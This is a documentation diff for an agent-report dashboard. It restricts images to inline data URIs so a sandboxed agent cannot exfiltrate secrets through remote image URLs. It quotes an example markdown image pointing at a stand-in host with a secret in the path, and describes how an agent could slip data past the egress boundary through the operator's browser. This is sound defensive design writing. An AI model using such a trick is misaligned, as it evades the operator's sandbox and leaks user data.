@@ -1442,10 +1442,18 @@ attributes and renders that as Preact vnodes, so a document's own `<script>` or
 with `rel="noopener noreferrer"`, and only absolute `http(s)`/`mailto` targets
 become links at all — a relative or fragment target would resolve against the
 dashboard's own origin rather than the repository its author meant, so it keeps
-its text and loses the anchor. Images may load from `http(s)` or from a `data:`
-raster URI, and carry `referrerpolicy="no-referrer"` so a remote one cannot
-learn the dashboard's address; an image the viewer will not load degrades to its
-alt text.
+its text and loses the anchor.
+
+Images are **inline-only**: a `data:` raster URI renders, and every remote or
+relative `src` degrades to the image's alt text. An `<img>` is the one thing in
+a document that reaches the network without the operator clicking anything, and
+the document's author is an agent that may be running behind tclaude's own
+egress boundary (see [Linux network filtering](linux-network-filtering.md)). A
+remote `src` would let such an agent write `![](https://host/<secret>)` and have
+the operator's unfiltered browser make the request it could not — carrying data
+out around the sandbox the operator configured, and revealing that (and when)
+the report was opened. Suppressing the referrer would hide which host asked, not
+that the request happened, so the viewer does not make the request at all.
 
 The daemon copies the bytes into its private data directory, so remote
 dashboards download through an authenticated route rather than receiving access to the agent's filesystem.
